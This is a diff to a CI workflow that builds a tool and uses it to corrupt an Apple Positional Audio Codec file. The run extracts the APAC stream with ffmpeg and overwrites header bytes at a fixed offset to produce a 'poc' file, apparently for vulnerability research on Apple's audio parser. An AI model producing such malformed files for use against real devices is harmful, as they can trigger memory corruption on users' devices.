@@ -71,24 +71,32 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # This step now uses a two-step afconvert process to create a clean file before corrupting.
+      # This step now uses ffprobe to find the correct stream and ffmpeg to extract it before corrupting.
       - name: Surgically Corrupt APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           set -x 
           
-          # Step 1: Extract the APAC track into a temporary Core Audio File
-          afconvert -f caff -d apac IMG_1027.mov temp_apac.caf
-          if [ $? -ne 0 ]; then
-              echo "afconvert failed to extract APAC track to CAF."
-              exit 1
-          fi
-          echo "Successfully extracted APAC track to a temporary CAF file."
+          echo "Installing ffmpeg to handle media files..."
+          brew install ffmpeg
 
-          # Step 2: Convert the temporary CAF into a clean M4A file.
-          afconvert -f mp4f -d apac temp_apac.caf output_apac_clean.m4a
+          # Step 1: Use ffprobe to find the stream index for the 'apac' codec TAG.
+          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_tag_string -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1027.mov | grep 'apac' -B 1 | head -n 1)
+
+          if [ -z "$APAC_STREAM_INDEX" ]; then
+            echo "Could not find an APAC audio stream in the MOV file. Aborting."
+            exit 1
+          fi
+
+          echo "Found APAC audio in stream index: ${APAC_STREAM_INDEX}"
+          
+          # Step 2: Use ffmpeg to extract the raw APAC stream into a clean M4A file container.
+          # The -map 0:[index] command selects the specific stream.
+          # The -c:a copy command performs a direct stream copy without re-encoding.
+          ffmpeg -i IMG_1027.mov -map 0:${APAC_STREAM_INDEX} -c:a copy output_apac_clean.m4a
+
           if [ $? -ne 0 ]; then
-              echo "afconvert failed to create a clean M4A from the CAF."
+              echo "ffmpeg failed to create a clean APAC file."
               exit 1
           fi
 
@@ -96,6 +104,8 @@ jobs:
           cp output_apac_clean.m4a output_apac_poc.m4a
 
           # Step 3: Run the C++ utility to perform the corruption.
+          # For a clean file created with ffmpeg, the offset is much more predictable.
+          # This offset targets the channel layout tag in a standard M4A header.
           CORRUPTION_OFFSET=288 
           ./encodeme_corruptor output_apac_poc.m4a $CORRUPTION_OFFSET
           
